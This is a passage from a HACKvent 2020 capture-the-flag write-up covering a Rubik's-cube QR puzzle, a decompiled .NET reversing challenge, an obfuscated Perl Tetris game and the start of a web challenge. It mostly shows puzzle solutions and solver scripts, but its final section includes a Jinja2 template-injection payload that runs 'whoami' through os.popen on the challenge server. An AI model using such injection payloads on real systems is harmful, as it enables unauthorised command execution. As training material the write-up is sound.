<span id="cb10-3"><a href="#cb10-3"></a><span class="dt">--- a/py222.py</span></span>
<span id="cb10-4"><a href="#cb10-4"></a><span class="dt">+++ b/py222.py</span></span>
<span id="cb10-5"><a href="#cb10-5"></a><span class="dt">@@ -110,7 +110,8 @@ fact6 = np.array([720, 120, 24, 6, 2, 1])</span></span>
<span id="cb10-6"><a href="#cb10-6"></a> </span>
<span id="cb10-7"><a href="#cb10-7"></a> # get FC-normalized solved state</span>
<span id="cb10-8"><a href="#cb10-8"></a> def initState():</span>
<span id="cb10-9"><a href="#cb10-9"></a><span class="st">-  return np.array([0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5])</span></span>
<span id="cb10-10"><a href="#cb10-10"></a><span class="va">+  # return np.array([0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5])</span></span>
<span id="cb10-11"><a href="#cb10-11"></a><span class="va">+  return np.array(range(0, 6*4))</span></span>
<span id="cb10-12"><a href="#cb10-12"></a> </span>
<span id="cb10-13"><a href="#cb10-13"></a> # apply a move to a state</span>
<span id="cb10-14"><a href="#cb10-14"></a> def doMove(s, move):</span></code></pre></div>
<p>"selbmarcs" ==&gt; "scrambles" reversed, so undo scrambles according to the World Cube Association (WCA) notation standard. To reverse, we need to reverse the order and swap directions on 90¬∞ rotations. With that, basically, X' becomes X and X becomes X'.</p>
<p>With that, we could apply one scramble after another and check whether each one of the 6 sides had three big and one small QR code target. Checking this prevented us from having to keep track of a tile's orientation (which - as it turned out - would have been useful for the challenge on day 16).</p>
<p><strong>Scramble 4</strong> was the winner:</p>
<pre><code># Scramble 4
print(&quot;Scramble 4&quot;)
s = initState()
# Forward
# s = doAlgStr(s, &quot;B2 L U&#39; B R2 U D&#39; F2 R&#39; B&#39;&quot;)
# Reverse
s = doAlgStr(s, &quot;B R F2 D U&#39; R2 B&#39; U L&#39; B2&quot;)
printCube(s)
</code></pre>
<p>(The full source code can be found <a href="./dec06.tar.gz">here</a>).</p>
<p>After adjusting the orientation of all tiles, the following image could be made in GIMP: <img src="./qr_tiles_assembled.png" alt="QRubick GIMP action" /></p>
<p>The following strings could be read from the QR codes:</p>
<pre><code>Face 16, 09, 18, 19 ==&gt; &quot;HV20{Erno_&quot;
Face 04, 01, 10, 17 ==&gt; &quot;Rubik_would&quot;
Face 11, 21, 15, 23 ==&gt; &quot;_be_proud.&quot;
Face 13, 20, 00, 03 ==&gt; &quot;Petrus_is&quot;
Face 14, 12, 07, 08 ==&gt; &quot;_Valid.&quot;
Face 05, 06, 02, 22 ==&gt; &quot;#HV20QRubicsChal}&quot;
</code></pre>
<h2 id="tools-4">Tools</h2>
<ul>
<li>Imagemagick (convert)</li>
<li>python</li>
<li>GIMP</li>
</ul>
<h2 id="flag-5">Flag</h2>
<p><code>HV20{Erno_Rubik_would_be_proud.Petrus_is_Valid.#HV20QRubicsChal}</code></p>
<h1 id="hv2007-bad-morals">HV20.07 Bad morals</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>kuyaya</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>reverse engineering</code>, <code>programming</code></td>
</tr>
</tbody>
</table>
<h2 id="description-6">Description</h2>
<p>One of the elves recently took a programming 101 course. Trying to be helpful, he implemented a program for Santa to generate all the flags for him for this year's HACKvent 2020. The problem is, he can't remember how to use the program any more and the link to the documentation just says <code>404 Not found</code>. I bet he learned that in the Programming 101 class as well.</p>
<p>Can you help him get the flag back?</p>
<p><a href="./cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe">BadMorals.exe</a></p>
<h3 id="hints-2">Hints</h3>
<p>There are nearly infinite inputs that pass almost all the tests in the program. For the correct flag, the final test has to be successful as well.</p>
<h2 id="approach-6">Approach</h2>
<p>Analysing the file hinted that it was a Mono/.Net file:</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1"></a>$ <span class="fu">file</span> cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe </span>
<span id="cb13-2"><a href="#cb13-2"></a><span class="ex">cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe</span>: PE32 executable (console) <span class="ex">Intel</span> 80386 Mono/.Net assembly, for MS Windows</span></code></pre></div>
<p>Searching for a decompiler for such files resulted in finding <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>. A variant with a frontend for Linux is provided by <a href="https://github.com/icsharpcode/AvaloniaILSpy">AvaloniaILSpy</a>.</p>
<p>The decompiled code (Main) looks as follows (slightly shortened for brevity):</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode cs"><code class="sourceCode cs"><span id="cb14-1"><a href="#cb14-1"></a><span class="kw">public</span> <span class="kw">static</span> <span class="dt">void</span> <span class="fu">Main</span>(<span class="dt">string</span>[] args)</span>
<span id="cb14-2"><a href="#cb14-2"></a>{</span>
<span id="cb14-3"><a href="#cb14-3"></a>    <span class="kw">try</span></span>
<span id="cb14-4"><a href="#cb14-4"></a>    {</span>
<span id="cb14-5"><a href="#cb14-5"></a>        Console.<span class="fu">Write</span>(<span class="st">&quot;Your first input: &quot;</span>);</span>
<span id="cb14-6"><a href="#cb14-6"></a>        <span class="dt">char</span>[] array = Console.<span class="fu">ReadLine</span>().<span class="fu">ToCharArray</span>();</span>
<span id="cb14-7"><a href="#cb14-7"></a>        <span class="dt">string</span> text = <span class="st">&quot;&quot;</span>;</span>
<span id="cb14-8"><a href="#cb14-8"></a>        <span class="dt">string</span> text2 = <span class="st">&quot;&quot;</span>;</span>
<span id="cb14-9"><a href="#cb14-9"></a>        <span class="kw">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; array.<span class="fu">Length</span>; i++)</span>
<span id="cb14-10"><a href="#cb14-10"></a>        {</span>
<span id="cb14-11"><a href="#cb14-11"></a>            <span class="kw">if</span> (i % <span class="dv">2</span> == <span class="dv">0</span> &amp;&amp; i + <span class="dv">2</span> &lt;= array.<span class="fu">Length</span>)</span>
<span id="cb14-12"><a href="#cb14-12"></a>            {</span>
<span id="cb14-13"><a href="#cb14-13"></a>                text += array[i + <span class="dv">1</span>].<span class="fu">ToString</span>();</span>
<span id="cb14-14"><a href="#cb14-14"></a>            }</span>
<span id="cb14-15"><a href="#cb14-15"></a>        }</span>
<span id="cb14-16"><a href="#cb14-16"></a>        <span class="kw">if</span> (text == <span class="st">&quot;BumBumWithTheTumTum&quot;</span>)</span>
<span id="cb14-17"><a href="#cb14-17"></a>        {</span>
<span id="cb14-18"><a href="#cb14-18"></a>            text2 = <span class="st">&quot;SFYyMH&quot;</span> + array[<span class="dv">17</span>].<span class="fu">ToString</span>() + <span class="st">&quot;yMz&quot;</span> + array[<span class="dv">8</span>].<span class="fu">GetHashCode</span>() % <span class="dv">10</span> + <span class="st">&quot;zcnMzXzN&quot;</span> + array[<span class="dv">3</span>].<span class="fu">ToString</span>() + <span class="st">&quot;ZzF&quot;</span> + array[<span class="dv">9</span>].<span class="fu">ToString</span>() + <span class="st">&quot;MzNyM&quot;</span> + array[<span class="dv">13</span>].<span class="fu">ToString</span>() + <span class="st">&quot;5n&quot;</span> + array[<span class="dv">14</span>].<span class="fu">ToString</span>() + <span class="st">&quot;2&quot;</span>;</span>
<span id="cb14-19"><a href="#cb14-19"></a>            <span class="kw">goto</span> IL_<span class="dv">0141</span>;</span>
<span id="cb14-20"><a href="#cb14-20"></a>        }</span>
<span id="cb14-21"><a href="#cb14-21"></a>        <span class="kw">if</span> (!(text == <span class="st">&quot;&quot;</span>))</span>
<span id="cb14-22"><a href="#cb14-22"></a>        {</span>
<span id="cb14-23"><a href="#cb14-23"></a>            text2 = text;</span>
<span id="cb14-24"><a href="#cb14-24"></a>            <span class="kw">goto</span> IL_<span class="dv">0141</span>;</span>
<span id="cb14-25"><a href="#cb14-25"></a>        }</span>
<span id="cb14-26"><a href="#cb14-26"></a>        Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Your input is not allowed to result in an empty string&quot;</span>);</span>
<span id="cb14-27"><a href="#cb14-27"></a>        <span class="kw">goto</span> end_IL_<span class="dv">0000</span>;</span>
<span id="cb14-28"><a href="#cb14-28"></a>        IL_<span class="dv">0141</span>:</span>
<span id="cb14-29"><a href="#cb14-29"></a>        Console.<span class="fu">Write</span>(<span class="st">&quot;Your second input: &quot;</span>);</span>
<span id="cb14-30"><a href="#cb14-30"></a>        <span class="dt">char</span>[] array2 = Console.<span class="fu">ReadLine</span>().<span class="fu">ToCharArray</span>();</span>
<span id="cb14-31"><a href="#cb14-31"></a>        text = <span class="st">&quot;&quot;</span>;</span>
<span id="cb14-32"><a href="#cb14-32"></a>        <span class="dt">string</span> text3 = <span class="st">&quot;&quot;</span>;</span>
<span id="cb14-33"><a href="#cb14-33"></a>        Array.<span class="fu">Reverse</span>(array2);</span>
<span id="cb14-34"><a href="#cb14-34"></a>        <span class="kw">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; array2.<span class="fu">Length</span>; j++)</span>
<span id="cb14-35"><a href="#cb14-35"></a>        {</span>
<span id="cb14-36"><a href="#cb14-36"></a>            text += array2[j].<span class="fu">ToString</span>();</span>
<span id="cb14-37"><a href="#cb14-37"></a>        }</span>
<span id="cb14-38"><a href="#cb14-38"></a>        <span class="kw">if</span> (text == <span class="st">&quot;BackAndForth&quot;</span>)</span>
<span id="cb14-39"><a href="#cb14-39"></a>        {</span>
<span id="cb14-40"><a href="#cb14-40"></a>            text3 = <span class="st">&quot;Q1RGX3&quot;</span> + array2[<span class="dv">11</span>].<span class="fu">ToString</span>() + <span class="st">&quot;sNH&quot;</span> + array2[<span class="dv">8</span>].<span class="fu">ToString</span>() + <span class="st">&quot;xbm&quot;</span> + array2[<span class="dv">5</span>].<span class="fu">ToString</span>() + <span class="st">&quot;f&quot;</span>;</span>
<span id="cb14-41"><a href="#cb14-41"></a>            <span class="kw">goto</span> IL_021c;</span>
<span id="cb14-42"><a href="#cb14-42"></a>        }</span>
<span id="cb14-43"><a href="#cb14-43"></a>        <span class="kw">if</span> (!(text == <span class="st">&quot;&quot;</span>))</span>
<span id="cb14-44"><a href="#cb14-44"></a>        {</span>
<span id="cb14-45"><a href="#cb14-45"></a>            text3 = text;</span>
<span id="cb14-46"><a href="#cb14-46"></a>            <span class="kw">goto</span> IL_021c;</span>
<span id="cb14-47"><a href="#cb14-47"></a>        }</span>
<span id="cb14-48"><a href="#cb14-48"></a>        Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Your input is not allowed to result in an empty string&quot;</span>);</span>
<span id="cb14-49"><a href="#cb14-49"></a>        <span class="kw">goto</span> end_IL_<span class="dv">0000</span>;</span>
<span id="cb14-50"><a href="#cb14-50"></a>        IL_021c:</span>
<span id="cb14-51"><a href="#cb14-51"></a>        Console.<span class="fu">Write</span>(<span class="st">&quot;Your third input: &quot;</span>);</span>
<span id="cb14-52"><a href="#cb14-52"></a>        <span class="dt">char</span>[] array3 = Console.<span class="fu">ReadLine</span>().<span class="fu">ToCharArray</span>();</span>
<span id="cb14-53"><a href="#cb14-53"></a>        text = <span class="st">&quot;&quot;</span>;</span>
<span id="cb14-54"><a href="#cb14-54"></a>        <span class="dt">string</span> text4 = <span class="st">&quot;&quot;</span>;</span>
<span id="cb14-55"><a href="#cb14-55"></a>        <span class="dt">byte</span> b = <span class="dv">42</span>;</span>
<span id="cb14-56"><a href="#cb14-56"></a>        <span class="kw">for</span> (<span class="dt">int</span> k = <span class="dv">0</span>; k &lt; array3.<span class="fu">Length</span>; k++)</span>
<span id="cb14-57"><a href="#cb14-57"></a>        {</span>
<span id="cb14-58"><a href="#cb14-58"></a>            <span class="dt">char</span> c = (<span class="dt">char</span>)(array3[k] ^ b);</span>
<span id="cb14-59"><a href="#cb14-59"></a>            b = (<span class="dt">byte</span>)(b + k - <span class="dv">4</span>);</span>
<span id="cb14-60"><a href="#cb14-60"></a>            text += c.<span class="fu">ToString</span>();</span>
<span id="cb14-61"><a href="#cb14-61"></a>        }</span>
<span id="cb14-62"><a href="#cb14-62"></a>        <span class="kw">if</span> (text == <span class="st">&quot;DinosAreLit&quot;</span>)</span>
<span id="cb14-63"><a href="#cb14-63"></a>        {</span>
<span id="cb14-64"><a href="#cb14-64"></a>            text4 = <span class="st">&quot;00ZD&quot;</span> + array3[<span class="dv">3</span>].<span class="fu">ToString</span>() + <span class="st">&quot;f&quot;</span> + array3[<span class="dv">2</span>].<span class="fu">ToString</span>() + <span class="st">&quot;zRzeX0=&quot;</span>;</span>
<span id="cb14-65"><a href="#cb14-65"></a>            <span class="kw">goto</span> IL_<span class="fl">02e9</span>;</span>
<span id="cb14-66"><a href="#cb14-66"></a>        }</span>
<span id="cb14-67"><a href="#cb14-67"></a>        <span class="kw">if</span> (!(text == <span class="st">&quot;&quot;</span>))</span>
<span id="cb14-68"><a href="#cb14-68"></a>        {</span>
<span id="cb14-69"><a href="#cb14-69"></a>            text4 = text;</span>
<span id="cb14-70"><a href="#cb14-70"></a>            <span class="kw">goto</span> IL_<span class="fl">02e9</span>;</span>
<span id="cb14-71"><a href="#cb14-71"></a>        }</span>
<span id="cb14-72"><a href="#cb14-72"></a>        Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Your input is not allowed to result in an empty string&quot;</span>);</span>
<span id="cb14-73"><a href="#cb14-73"></a>        <span class="kw">goto</span> end_IL_<span class="dv">0000</span>;</span>
<span id="cb14-74"><a href="#cb14-74"></a>        IL_<span class="fl">02e9</span>:</span>
<span id="cb14-75"><a href="#cb14-75"></a>        <span class="dt">byte</span>[] array4 = Convert.<span class="fu">FromBase64String</span>(text2 + text4);</span>
<span id="cb14-76"><a href="#cb14-76"></a>        <span class="dt">byte</span>[] array5 = Convert.<span class="fu">FromBase64String</span>(text3);</span>
<span id="cb14-77"><a href="#cb14-77"></a>        <span class="dt">byte</span>[] array6 = <span class="kw">new</span> <span class="dt">byte</span>[array4.<span class="fu">Length</span>];</span>
<span id="cb14-78"><a href="#cb14-78"></a>        <span class="kw">for</span> (<span class="dt">int</span> l = <span class="dv">0</span>; l &lt; array4.<span class="fu">Length</span>; l++)</span>
<span id="cb14-79"><a href="#cb14-79"></a>        {</span>
<span id="cb14-80"><a href="#cb14-80"></a>            array6[l] = (<span class="dt">byte</span>)(array4[l] ^ array5[l % array5.<span class="fu">Length</span>]);</span>
<span id="cb14-81"><a href="#cb14-81"></a>        }</span>
<span id="cb14-82"><a href="#cb14-82"></a>        <span class="dt">byte</span>[] array7 = SHA1.<span class="fu">Create</span>().<span class="fu">ComputeHash</span>(array6);</span>
<span id="cb14-83"><a href="#cb14-83"></a>        <span class="dt">byte</span>[] array8 = <span class="kw">new</span> <span class="dt">byte</span>[<span class="dv">20</span>]</span>
<span id="cb14-84"><a href="#cb14-84"></a>        {</span>
<span id="cb14-85"><a href="#cb14-85"></a>            <span class="dv">107</span>, <span class="dv">64</span>, <span class="dv">119</span>, <span class="dv">202</span>, <span class="dv">154</span>, <span class="dv">218</span>, <span class="dv">200</span>, <span class="dv">113</span>, <span class="dv">1</span>, <span class="dv">66</span>, <span class="dv">148</span>, <span class="dv">207</span>, <span class="dv">23</span>, <span class="dv">254</span>, <span class="dv">198</span>, <span class="dv">197</span>, <span class="dv">79</span>, <span class="dv">21</span>, <span class="dv">10</span></span>
<span id="cb14-86"><a href="#cb14-86"></a>        };</span>
<span id="cb14-87"><a href="#cb14-87"></a>        <span class="kw">for</span> (<span class="dt">int</span> m = <span class="dv">0</span>; m &lt; array7.<span class="fu">Length</span>; m++)</span>
<span id="cb14-88"><a href="#cb14-88"></a>        {</span>
<span id="cb14-89"><a href="#cb14-89"></a>            <span class="kw">if</span> (array7[m] != array8[m])</span>
<span id="cb14-90"><a href="#cb14-90"></a>            {</span>
<span id="cb14-91"><a href="#cb14-91"></a>                Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Your inputs do not result in the flag.&quot;</span>);</span>
<span id="cb14-92"><a href="#cb14-92"></a>                <span class="kw">return</span>;</span>
<span id="cb14-93"><a href="#cb14-93"></a>            }</span>
<span id="cb14-94"><a href="#cb14-94"></a>        }</span>
<span id="cb14-95"><a href="#cb14-95"></a>        <span class="dt">string</span> @string = Encoding.<span class="fu">ASCII</span>.<span class="fu">GetString</span>(array4);</span>
<span id="cb14-96"><a href="#cb14-96"></a>        <span class="kw">if</span> (@string.<span class="fu">StartsWith</span>(<span class="st">&quot;HV20{&quot;</span>))</span>
<span id="cb14-97"><a href="#cb14-97"></a>        {</span>
<span id="cb14-98"><a href="#cb14-98"></a>            Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Congratulations! You&#39;re now worthy to claim your flag: {0}&quot;</span>, @string);</span>
<span id="cb14-99"><a href="#cb14-99"></a>        }</span>
<span id="cb14-100"><a href="#cb14-100"></a>        end_IL_<span class="dv">0000</span>:;</span>
<span id="cb14-101"><a href="#cb14-101"></a>    }</span>
<span id="cb14-102"><a href="#cb14-102"></a>    <span class="kw">catch</span></span>
<span id="cb14-103"><a href="#cb14-103"></a>    {</span>
<span id="cb14-104"><a href="#cb14-104"></a>        Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Please try again.&quot;</span>);</span>
<span id="cb14-105"><a href="#cb14-105"></a>    }</span>
<span id="cb14-106"><a href="#cb14-106"></a>    <span class="kw">finally</span></span>
<span id="cb14-107"><a href="#cb14-107"></a>    {</span>
<span id="cb14-108"><a href="#cb14-108"></a>        Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Press enter to exit.&quot;</span>);</span>
<span id="cb14-109"><a href="#cb14-109"></a>        Console.<span class="fu">ReadLine</span>();</span>
<span id="cb14-110"><a href="#cb14-110"></a>    }</span>
<span id="cb14-111"><a href="#cb14-111"></a>}</span></code></pre></div>
<p>For all three inputs, most of the characters were easily revertable. So, we ended up with a base64 string with 2 unknown positions: <code>SFYyMHtyMz{}zcnMzXzNuZzFuMzNyMW5n{}200ZDNfMzRzeX0=</code>.</p>
<p>At first, one is tempted to try through possibilities manually, as for the first missing characters only chars <code>0</code> through <code>9</code> were possible. All flag submissions failed, though...</p>
<p>I therefore wrote a small solver script to check for the hash indicated in the source file:</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1"></a><span class="im">import</span> base64</span>
<span id="cb15-2"><a href="#cb15-2"></a><span class="im">from</span> hashlib <span class="im">import</span> sha1</span>
<span id="cb15-3"><a href="#cb15-3"></a></span>
<span id="cb15-4"><a href="#cb15-4"></a><span class="cf">for</span> a <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">9</span>):</span>
<span id="cb15-5"><a href="#cb15-5"></a>    <span class="cf">for</span> b <span class="kw">in</span> <span class="st">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span>:</span>
<span id="cb15-6"><a href="#cb15-6"></a>        <span class="cf">try</span>:</span>
<span id="cb15-7"><a href="#cb15-7"></a>            flag <span class="op">=</span> base64.b64decode(<span class="st">&quot;SFYyMHtyMz</span><span class="sc">{}</span><span class="st">zcnMzXzNuZzFuMzNyMW5n</span><span class="sc">{}</span><span class="st">200ZDNfMzRzeX0=&quot;</span>.<span class="bu">format</span>(a, b))</span>
<span id="cb15-8"><a href="#cb15-8"></a>        <span class="cf">except</span> <span class="pp">UnicodeDecodeError</span>:</span>
<span id="cb15-9"><a href="#cb15-9"></a>            <span class="bu">print</span>(<span class="st">&quot;Error with a=</span><span class="sc">{}</span><span class="st"> and b=</span><span class="sc">{}</span><span class="st">&quot;</span>.<span class="bu">format</span>(a, b))</span>
<span id="cb15-10"><a href="#cb15-10"></a>            <span class="cf">continue</span></span>
<span id="cb15-11"><a href="#cb15-11"></a>        key <span class="op">=</span> base64.b64decode(<span class="st">&quot;Q1RGX3hsNHoxbmnf&quot;</span>)</span>
<span id="cb15-12"><a href="#cb15-12"></a>        arr <span class="op">=</span> <span class="bu">bytearray</span>()</span>
<span id="cb15-13"><a href="#cb15-13"></a></span>
<span id="cb15-14"><a href="#cb15-14"></a>        <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(flag)):</span>
<span id="cb15-15"><a href="#cb15-15"></a>            arr.append(flag[i] <span class="op">^</span> key[i <span class="op">%</span> <span class="bu">len</span>(key)])</span>
<span id="cb15-16"><a href="#cb15-16"></a></span>
<span id="cb15-17"><a href="#cb15-17"></a>        <span class="cf">if</span> <span class="st">&quot;6b4077ca9adac8713f014294cf17fec6c54f150a&quot;</span> <span class="op">==</span> sha1(arr).hexdigest():</span>
<span id="cb15-18"><a href="#cb15-18"></a>            <span class="bu">print</span>(flag)</span>
<span id="cb15-19"><a href="#cb15-19"></a>            <span class="bu">print</span>(<span class="st">&quot;Success with a=</span><span class="sc">{}</span><span class="st"> and b=</span><span class="sc">{}</span><span class="st">&quot;</span>.<span class="bu">format</span>(a, b))</span></code></pre></div>
<p>The missing characters to produce the right flag were <code>a=8</code> and <code>b=X</code>:</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1"></a><span class="co">&#39;SFYyMHtyMz{}zcnMzXzNuZzFuMzNyMW5n{}200ZDNfMzRzeX0=&#39;</span>.<span class="bu">format</span>(<span class="dv">8</span>, X)</span></code></pre></div>
<h2 id="tools-5">Tools</h2>
<ul>
<li><a href="https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v5.0-rc2">ILSpy</a> - a decompiler for .NET (Mono) code (very happy I used this one)</li>
<li>CyberChef - did not bring the breakthrough</li>
<li>Python</li>
</ul>
<h2 id="flag-6">Flag</h2>
<p><code>HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}</code></p>
<h2 id="credits">Credits</h2>
<p>To <em>The Compiler</em> for confirming I'm on the right track it was only my implementation that was wrong.</p>
<h1 id="hv2008-the-game">HV20.08 The game</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>M. (who else)</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>reverse engineering</code>, <code>fun</code></td>
</tr>
</tbody>
</table>
<h2 id="description-7">Description</h2>
<p>Let's play another little game this year. Once again, as every year, I promise it is hardly obfuscated.</p>
<p><a href="./1456c098-0318-4370-ae1f-c4f6e51e2d50.txt">Download</a></p>
<h3 id="requirements-1">Requirements</h3>
<p>Perl &amp; Term::ReadKey module (from CPAN or apt install libterm-readkey-perl for debian / ubuntu based systems)</p>
<h2 id="approach-7">Approach</h2>
<h3 id="analysis">Analysis</h3>
<p>The supplied txt file contained a perl program (hey, it's M.!). Zooming out in a browsers let's you see the full beauty of <em>M.</em>'s challenge:</p>
<p><img src="./formatted_perl_by_M.png" alt="Beatiful perl" /></p>
<p>Running the program started a colorful Tetris game in the console with blocks containing flag characters:</p>
<p><img src="./running_tetris.png" alt="Console Tetris" /></p>
<p>So beatiful, despite being written in perl (üòâ). I mean, who does that? <em>M.</em> you are an artist!</p>
<h3 id="solution">Solution</h3>
<ul>
<li>Replace the first <code>eval</code> statement by a <code>print</code> statement to obtain a less obfuscated perl script.</li>
<li>Make the code readable by running <code>perltidy script.pl</code>.</li>
<li>Find the "flake" (I just created this word, it's a mixup of <em>fake</em> and <em>flag</em>): <code>HV20{https://www.youtube.com/watch?v=dQw4w9WgXcQ}</code></li>
<li>Keep humming "Never gonna give you up..."</li>
<li>Make sure the infinite loop towards the end of the script never ends by commenting out all <code>last ...</code> statements.</li>
<li>Try to find the variable holding the flags characters - it's variable <code>$bc</code> on line 44.</li>
<li>Add a print (to STDERR) statement right before that line: <code>print { *STDERR } $bc;</code>.</li>
<li>Run the script and redirect error output to a file: <code>perl script_04_solved.pl 2&gt;out.txt</code>.</li>
<li>Re-arrange the text a bit and profit.</li>
</ul>
<p>The patch:</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb17-1"><a href="#cb17-1"></a><span class="kw">--- script_03_tidied.pl 2020-12-08 22:15:11.467291509 +0100</span></span>
<span id="cb17-2"><a href="#cb17-2"></a><span class="dt">+++ script_04_solved.pl 2020-12-08 22:27:33.604678583 +0100</span></span>
<span id="cb17-3"><a href="#cb17-3"></a><span class="dt">@@ -39,6 +39,7 @@</span></span>
<span id="cb17-4"><a href="#cb17-4"></a> </span>
<span id="cb17-5"><a href="#cb17-5"></a> sub _s {</span>
<span id="cb17-6"><a href="#cb17-6"></a>     ( $b, $bc, $x, $y ) = @_;</span>
<span id="cb17-7"><a href="#cb17-7"></a><span class="va">+    print { *STDERR } $bc unless &#39;#&#39; eq $bc;</span></span>
<span id="cb17-8"><a href="#cb17-8"></a>     for $yy ( 0 .. 2 ) {</span>
<span id="cb17-9"><a href="#cb17-9"></a>         for $xx ( 0 .. 5 ) {</span>
<span id="cb17-10"><a href="#cb17-10"></a>             substr( $f[ $yy + $y ], ( $xx + $x ), 1 ) = $bc</span>
<span id="cb17-11"><a href="#cb17-11"></a><span class="dt">@@ -101,7 +102,7 @@</span></span>
<span id="cb17-12"><a href="#cb17-12"></a> n();</span>
<span id="cb17-13"><a href="#cb17-13"></a> while (1) {</span>
<span id="cb17-14"><a href="#cb17-14"></a>     $k = k();</span>
<span id="cb17-15"><a href="#cb17-15"></a><span class="st">-    last if ( $k =~ /q/ );</span></span>
<span id="cb17-16"><a href="#cb17-16"></a><span class="va">+    #last if ( $k =~ /q/ );</span></span>
<span id="cb17-17"><a href="#cb17-17"></a>     $k  = substr( $k, 2, 1 );</span>
<span id="cb17-18"><a href="#cb17-18"></a>     $dx = ( $k eq &#39;C&#39; ) - ( $k eq &#39;D&#39; );</span>
<span id="cb17-19"><a href="#cb17-19"></a>     $bx += $dx unless ( cb( $__, $bx + $dx, $by ) );</span>
<span id="cb17-20"><a href="#cb17-20"></a><span class="dt">@@ -113,7 +114,7 @@</span></span>
<span id="cb17-21"><a href="#cb17-21"></a>     bl( $__, $_b, 101 + $bi, $bx, $by );</span>
<span id="cb17-22"><a href="#cb17-22"></a>     select( undef, undef, undef, 0.1 );</span>
<span id="cb17-23"><a href="#cb17-23"></a>     if ( cb( $__, $bx, ++$by ) ) {</span>
<span id="cb17-24"><a href="#cb17-24"></a><span class="st">-        last if ( $by &lt; 2 );</span></span>
<span id="cb17-25"><a href="#cb17-25"></a><span class="va">+        #last if ( $by &lt; 2 );</span></span>
<span id="cb17-26"><a href="#cb17-26"></a>         _s( $__, $_b, $bx, $by - 1 );</span>
<span id="cb17-27"><a href="#cb17-27"></a>         n();</span>
<span id="cb17-28"><a href="#cb17-28"></a>     }</span></code></pre></div>
<p>The scripts in their different stages:</p>
<ul>
<li>0: <a href="./script_00.pl">Original script</a></li>
<li>1: <a href="./script_01_print_eval.pl">Script</a> printing the script after obfuscation stage 1.</li>
<li>2: The slightly more readable <a href="./script_02_deobfuscated.pl">script</a> after obfuscation stage 1.</li>
<li>3: The tidied up <a href="./script_03_tidied.pl">script</a>.</li>
<li>4: The <a href="./script_04_solved.pl">script</a> with the solving patch applied.</li>
</ul>
<h2 id="tools-6">Tools</h2>
<ul>
<li>perl - what a surprise</li>
<li>perltidy - readable code is comprehensible code</li>
<li>bash</li>
</ul>
<h2 id="flag-7">Flag</h2>
<p><code>HV20{https://www.youtube.com/watch?v=Alw5hs0chj0}</code></p>
<h1 id="hv2009-santas-gingerbread-factory">HV20.09 Santa's Gingerbread Factory</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>inik</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>penetration testing</code>, <code>web security</code></td>
</tr>
</tbody>
</table>
<h2 id="description-8">Description</h2>
<h3 id="introduction-1">Introduction</h3>
<p>Here you can customize your absolutely fat-free gingerbread man.</p>
<p><strong>Note</strong>: Start your personal instance from the <code>RESOURCES</code> section on top.</p>
<h3 id="goal--mission">Goal / Mission</h3>
<p>Besides the gingerbread men, there are other goodies there. Let's see if you can get the goodie, which is stored in <code>/flag.txt</code>.</p>
<h2 id="approach-8">Approach</h2>
<p>After some clueless attempts entering random characters, the input <code>eyes=vader&amp;name=bla&lt;'///&gt;&lt;`\\"+*√ß%&amp;/()=</code> caused an exception in the application and returned an error page along with a <a href="https://werkzeug.palletsprojects.com/en/1.0.x/debug/">debugger, provided by the Werkzeug framework</a>.</p>
<p>Fiddling around with the debugger did not lead anywhere, as we didn't know the PIN to run a shell - exploits <a href="https://github.com/its-arun/Werkzeug-Debug-RCE/blob/master/werkzeug.py">like this one</a> were not possible.</p>
<p>However, the error page also showed, that user input was concatenated with the Jinja2 template and rendered as a whole. That became the focus now.</p>
<p>Using Burpsuite's Repeater, I proceeded to abusing the template. It was a bit harder than initially thought, since you can't simply <code>import</code> anything you want. The following payload did not work:</p>
<pre><code>eyes=*&amp;name={%25+__import__(&#39;os&#39;).popen(\&#39;whoami\&#39;).read()%3b+%25}
</code></pre>
